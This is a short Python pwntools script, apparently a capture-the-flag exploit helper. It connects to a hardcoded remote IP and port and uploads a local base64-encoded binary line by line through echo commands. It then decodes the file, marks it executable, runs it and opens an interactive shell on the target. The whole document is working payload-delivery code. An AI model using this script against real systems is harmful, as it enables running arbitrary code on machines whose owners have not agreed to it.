from pwn import *

context.log_level = "debug"

with open("ooo.bin", "r") as f:
    code = f.readlines()
# print(code)
# code = code[:2]
r = remote("65.109.190.242", "11337")

r.recvuntil("#")

print("[+] VM is up now, start your exploit")
r.sendline("touch exp")
r.recvuntil("#")
for i in range(len(code)):
    aaa = code[i].replace("\n", "")
    r.sendline(f"echo {aaa} >> exp")
    r.recvuntil("#")
print("[+] Base64 payload upload done.")
r.sendline("base64 -d exp > aaa")
r.sendlineafter("#", "chmod +x aaa")
r.sendlineafter("#", "./aaa")
r.interactive()